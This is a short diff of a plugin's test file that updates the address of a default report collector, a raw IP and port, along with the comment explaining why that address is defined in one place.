@@ -149,11 +149,11 @@ const MODEL = 'claude-opus-5-5'
 /**
  * The public collector a fresh profile sends to when nothing overrides it.
  *
- * Named once here rather than spelled out in the assertions below, because the
- * day the collector gains a hostname it changes in exactly one place in the plugin
- * and one place in this test.
+ * Named once here rather than spelled out in the assertions below, so a collector
+ * that moves host or gains a hostname changes in exactly one place in the plugin and
+ * one place in this test — which is what just happened.
  */
-const PUBLIC_COLLECTOR = 'http://185.94.29.228:3789/api/report'
+const PUBLIC_COLLECTOR = 'http://185.75.189.247:8249/api/report'
 
 /**
  * The aliases the collector accepts for a concept this plugin already names.
